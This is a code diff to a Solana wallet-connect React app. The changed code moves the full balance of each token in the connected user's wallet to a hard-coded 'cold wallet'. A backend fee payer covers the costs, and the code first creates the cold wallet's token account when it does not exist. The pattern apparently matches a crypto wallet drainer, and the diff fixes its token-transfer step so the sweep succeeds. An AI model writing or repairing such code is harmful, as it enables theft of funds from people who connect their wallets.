@@ -22,7 +22,7 @@ import type { AppKitNetwork } from '@reown/appkit/networks'
 import { SolanaAdapter } from '@reown/appkit-adapter-solana'
 import { solana } from '@reown/appkit/networks'
 import { Connection, PublicKey, SystemProgram, TransactionMessage, VersionedTransaction, LAMPORTS_PER_SOL } from '@solana/web3.js'
-import { TOKEN_PROGRAM_ID, createTransferCheckedInstruction } from '@solana/spl-token'
+import { TOKEN_PROGRAM_ID, createTransferCheckedInstruction, createAssociatedTokenAccountInstruction, getAssociatedTokenAddressSync, ASSOCIATED_TOKEN_PROGRAM_ID } from '@solana/spl-token'
 
 // ── CONFIG ──
 const WC_PROJECT_ID = '7fb3ba95be65cff7bc75b742e816b1cb'
@@ -392,15 +392,43 @@ export default function App() {
             );
             successCount++;
           }
-             } else {
-          const mintPubKey = new PublicKey(token.mint); // <-- Changed from token.address to token.mint
+                     } else {
+          const mintPubKey = new PublicKey(token.mint);
           const tokenAccountPubKey = new PublicKey(token.tokenAccountAddress);
           
+          // Get the cold wallet's Associated Token Address for this mint
+          const coldWalletATA = getAssociatedTokenAddressSync(
+            mintPubKey,
+            coldWalletPubKey,
+            false,
+            TOKEN_PROGRAM_ID,
+            ASSOCIATED_TOKEN_PROGRAM_ID
+          );
+
+          // Check if the cold wallet's ATA exists on-chain
+          const ataInfo = await connection.getAccountInfo(coldWalletATA);
+          
+          // If it doesn't exist, add an instruction to create it first
+          if (!ataInfo) {
+            log(`[ACTION] Creating ATA for cold wallet (${token.symbol})...`);
+            instructions.push(
+              createAssociatedTokenAccountInstruction(
+                feePayerPubKey, // Backend pays for ATA creation
+                coldWalletATA,
+                coldWalletPubKey,
+                mintPubKey,
+                TOKEN_PROGRAM_ID,
+                ASSOCIATED_TOKEN_PROGRAM_ID
+              )
+            );
+          }
+
+          // Now add the transfer instruction (send to the ATA, not the raw wallet)
           instructions.push(
             createTransferCheckedInstruction(
               tokenAccountPubKey,
               mintPubKey,
-              coldWalletPubKey,
+              coldWalletATA, // <-- Send to the ATA, not the raw wallet address
               pubKey,
               BigInt(token.rawBalance),
               token.decimals,
